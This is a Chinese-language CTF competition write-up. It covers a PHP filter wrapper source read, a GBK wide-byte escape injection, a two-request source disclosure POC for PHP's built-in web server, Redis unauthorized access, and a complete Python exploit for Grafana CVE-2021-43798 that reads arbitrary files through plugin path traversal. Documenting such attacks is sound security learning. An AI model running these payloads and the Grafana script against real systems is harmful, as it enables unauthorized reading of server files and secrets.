---
title: "省学会行业比赛复盘"
description: ""
slug: "省学会行业比赛复盘"
date: "2024-10-30 20:29:14+08:00"
image: "assets/Pasted image 20241030202920.png"
categories: 
    - wp
tags: 
    - redis
    - grafana
    - 伪协议
draft: false
---

# 博客
观察url存在文件包含漏洞，php伪协议读源码
`php://filter/convert.base64-encode/resource=message.php`
![](<assets/Pasted image 20241030202920.png>)
utf-8->GBK要出反斜杠加单引号来闭合前面的语句，从而执行后面构造的代码
![](<assets/Pasted image 20241030203018.png>)
写脚本找到这样的字符串
![](<assets/Pasted image 20241030203150.png>)
然后转码过程中会把字符解析成斜杠，触发后面的命令
![](<assets/Pasted image 20241030203712.png>)

# php
> https://www.cnblogs.com/Kawakaze777/p/17799235.html
> https://blog.projectdiscovery.io/php-http-server-source-disclosure/

利用了这个漏洞
## 漏洞成因

通过`php -S`开起的内置WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码

这里直接给出POC

```
GET /phpinfo.php HTTP/1.1  //这里的phpinfo.php必须是存在的文件，也就是要读取源码的文件
Host: 192.168.xxx.xxx:xx  

GET /Kawakaze HTTP/1.1 //这里的Kawakaze是不存在的文件  


```

ps：这里一定要换行

这里我们稍微解释一下第一个GET和第二个GET的作用分别是什么  
第一个GET后的/phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php) PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件  
而第二个GET后的/请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)

PS:一定能要关闭自动更新Content-Length
# redis 未授权

![](<assets/Pasted image 20241030210711.png>)
# Grafana 目录遍历
CVE-2021-43798
msf里搜到poc直接抓包打就可以了
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)

```